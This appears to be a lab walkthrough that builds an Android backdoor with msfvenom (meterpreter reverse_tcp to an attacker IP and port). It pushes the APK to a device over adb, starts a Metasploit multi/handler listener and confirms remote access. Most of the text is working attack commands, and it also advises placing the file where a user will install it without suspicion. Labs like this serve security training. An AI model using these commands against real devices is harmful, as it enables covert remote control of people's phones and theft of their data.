# Malicious APK

In this step, we will generate a malicious APK using the msfvenom tool.
`msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=5555 -o backdoor.apk`

The command above uses `msfvenom` to create a malicious payload for an Android device. This tool merges the functionalities of two older Metasploit utilities, `msfpayload` and `msfencode`.

- `-p android/meterpreter/reverse_tcp`
1. "-p" specifies the payload type.
2. "android/meterpreter/reverse_tcp" means the payload is for an Android device, and it creates a reverse TCP connection.

With a reverse TCP connection, the target (Android device) will connect back to the attacker's system (instead of the attacker directly accessing the target).

- `LHOST=192.168.1.100`

This is the local host IP address (the attacker's machine) that the target will connect back to.
- `LPORT=5555`

This is the local port on the attacker's machine that will listen for the connection. Port 5555 is used here.

- `-o backdoor.apk`

The -o option specifies the output file. Here, the payload will be embedded in an Android APK file named backdoor.apk.
# Adb (Android Debug Bridge)
To transfer the file, we first need to connect to the Android device. In our case, the device's IP address is 172.17.0.2.

Use the following command to connect:
`adb connect 172.17.0.2`

There's no need to specify the port, as ADB will assign it automatically. If the connection is successful, the output will display: "connected to 172.17.0.2:5555"

Now, we'll push the malicious APK file to the device using this command:
`adb push /home/ubuntu-user/backdoor.apk /sdcard/Download`

This command uses ADB to transfer the backdoor.apk from the specified directory on our machine to the /sdcard/Download directory on the Android device.

The /sdcard/Download directory is commonly used and familiar to users, making the APK easily accessible. This increases the likelihood that the user will open and install it without suspicion.
# Setting Up Metasploit Listener
we will configure Metasploit to listen for incoming connections. Let's begin by launching the Metasploit console with the following command:
`msfconsole`

This command configures Metasploit to use the multi-handler exploit, which is designed to manage incoming sessions from various payloads, allowing us to interact with the compromised device:
`use exploit/multi/handler`

This command sets the payload to Android Meterpreter reverse TCP, which enables the attacker to receive a reverse shell connection from the compromised Android device, allowing remote control and interaction with it:
`set payload android/meterpreter/reverse_tcp`

By running the following command:
`show options`

It requires a lhost (local host ip address) and lport (local port).

This command specifies the local host IP address (LHOST) that the target device will connect back to, ensuring the reverse shell targets the correct machine.
`set lhost 192.168.1.100`

This command sets the local port (LPORT) on the attacker's machine that will listen for incoming connections from the compromised device, facilitating the establishment of the reverse shell.
`set lport 5555`

Finally launch the exploit: `exploit`
# Deploying the APK and Verifying Access
While Metasploit is waiting for the connection, switch back to the web browser where the Android device is located.

Hold the right-click on your mouse and swipe up to open the menu. Click "Files."

In the Files app, click the three lines at the top-left corner to open the side menu. Navigate to Downloads, where you'll find the APK file we pushed earlier.

Click on the APK file and follow the prompts.

First one continue,

Second one install,

Third one open,

The last prompt will redirect you to the MainActivity app. Press continue on the last prompt.

Return to the terminal. You should see a new connection from 172.17.0.2 (the Android device).

To confirm that you've gained access to the Android device, run the following command:

sysinfo

At this point, you have successfully deployed the malicious APK, gained access to the Android device, and verified the connection using Metasploit. This completes the lab, demonstrating the entire process from payload creation to remote access.


